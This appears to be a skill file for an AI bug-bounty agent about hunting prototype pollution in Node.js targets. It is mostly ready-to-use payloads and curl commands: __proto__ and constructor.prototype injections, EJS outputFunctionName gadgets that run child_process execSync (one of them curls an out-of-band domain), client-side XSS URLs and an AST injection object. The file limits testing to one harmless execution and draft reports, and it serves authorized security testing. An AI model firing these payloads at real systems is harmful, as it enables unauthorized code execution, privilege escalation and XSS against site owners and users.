---
name: hunt-prototype-pollution
description: "Hunt prototype pollution — server-side (lodash.merge, deep-extend, qs), client-side (DOM via URL params/hash), known gadgets (EJS/Pug/Handlebars outputFunctionName, child_process shell/NODE_OPTIONS), AST injection, JSON merge/patch APIs. Use when a target runs Node.js and accepts nested JSON objects or deep query strings."
---

## Decision tree

| You see | Do once | Proves |
|---|---|---|
| JSON body merged/stored server-side (profile update, settings, config) | `{"__proto__":{"polluted":"pp-RAND"}}` | Marker visible on a DIFFERENT request that didn't send it |
| Query string parsed by `qs` library | `?__proto__[polluted]=pp-RAND` | Same: marker on a fresh request |
| `Content-Type: application/merge-patch+json` | `{"constructor":{"prototype":{"polluted":"pp-RAND"}}}` | Marker on a fresh request |
| Confirmed pollution + EJS/Pug/Handlebars | `{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id')//"}}`| Command output in response or OOB callback |
| Client-side JS reads URL hash/params into objects | `#__proto__[innerHTML]=<img/src/onerror=alert(1)>` | XSS fires in browser |

Always use a unique random marker (e.g. `pp-a7f3c`) so you can prove persistence vs reflection.

## Server-side pollution

### JSON body

```json
{"__proto__":{"isAdmin":true,"polluted":"pp-RAND"}}
{"constructor":{"prototype":{"isAdmin":true,"polluted":"pp-RAND"}}}
```

Send on ANY write endpoint that accepts nested JSON: profile update, settings save, webhook config, custom fields.

### Query string (qs library)

```
GET /api/search?__proto__[polluted]=pp-RAND&__proto__[isAdmin]=true
GET /api/search?constructor[prototype][polluted]=pp-RAND
```

### JSON Merge Patch (RFC 7396)

```bash
curl -X PATCH "$TARGET/api/settings" \
  -H "Content-Type: application/merge-patch+json" \
  -d '{"constructor":{"prototype":{"polluted":"pp-RAND"}}}'
```

### Verification — the critical step

After sending the pollution payload, make a CLEAN request (no pollution payload) and check if the marker is present:

```bash
# Pollute
curl -X POST "$TARGET/api/profile" -d '{"__proto__":{"pp_marker":"pp-RAND"}}' -H "Authorization: Bearer $A"

# Verify on a DIFFERENT endpoint or different user
curl "$TARGET/api/status" -H "Authorization: Bearer $B"
# If response contains pp_marker: "pp-RAND" → prototype is polluted
```

A response that echoes `__proto__` as a stored key is NOT pollution — it's just a weird field name stored and returned.

## Known server-side gadgets

| Template/Lib | Gadget property | Effect |
|---|---|---|
| EJS | `outputFunctionName` | RCE: `"x;require('child_process').execSync('id')//"` |
| Pug | `block`, `self` | Template injection |
| Handlebars (< 4.7.7) | `__lookupGetter__` | RCE via known CVE |
| child_process | `shell`, `NODE_OPTIONS` | Command injection on next spawn |
| HTTP library | `agent`, `headers` | SSRF via polluted default options |

Only attempt ONE gadget execution, then stop. Use `id` or OOB ping, never destructive commands.

```bash
curl -X POST "$TARGET/api/profile" \
  -d '{"__proto__":{"outputFunctionName":"x;process.mainModule.require(\"child_process\").execSync(\"curl OOB_DOMAIN/ejs-RAND\")//"}}' \
  -H "Content-Type: application/json" -H "Authorization: Bearer $A"

# Trigger a page render to execute the gadget
curl "$TARGET/dashboard" -H "Authorization: Bearer $A"
```

## Client-side pollution

Test via URL fragment or query parameters:

```
https://TARGET/#__proto__[innerHTML]=<img/src/onerror=alert(document.domain)>
https://TARGET/?__proto__[src]=data:,alert(1)
https://TARGET/#constructor.prototype.innerHTML=<img/src/onerror=alert(1)>
```

Check if the app uses `Object.assign({}, userInput)`, `$.extend(true, {}, params)`, or a vulnerable merge utility client-side. Common in SPAs that parse URL hash into config objects.

## AST injection

If the server passes user input through `JSON.parse` → AST manipulation → `eval` or `new Function`:

```json
{"__proto__":{"type":"Program","body":[{"type":"ExpressionStatement","expression":{"type":"CallExpression","callee":{"type":"Identifier","name":"require"},"arguments":[{"type":"Literal","value":"child_process"}]}}]}}
```

Rare but critical when found (template engines, custom DSLs).

## Validation

- **Server-side**: your marker MUST appear on a request that did NOT include it. Same user different endpoint, or different user same endpoint.
- **Gadget**: command execution proven via OOB callback or response content (output of `id`). One execution only.
- **Client-side**: XSS fires in browser with `alert(document.domain)` — screenshot it.
- A JSON response containing `{"__proto__": {"x":"y"}}` as a stored/reflected field is NOT pollution.

## Chains

- Server PP + EJS/Pug gadget → `hunt-rce` (proven code execution)
- Server PP + HTTP agent pollution → `hunt-ssrf` (requests routed through attacker proxy)
- Client PP + innerHTML gadget → `hunt-dom` (DOM XSS)
- PP + `isAdmin` property → `hunt-api-misconfig` (privilege escalation via polluted authz check)

## Before you report — dedup gate

```bash
python3 engine/dedup.py check --program <program> --class prototype-pollution --url "<endpoint>" --title "<title>"
```

`NOVEL` → `/validate`. `LIKELY_DUP` → stop. Draft only — do not submit.

Cross-refs: `hunt-api-misconfig`, `hunt-rce`, `hunt-dom`, `hunt-ssrf`, `hunt-ssti`.
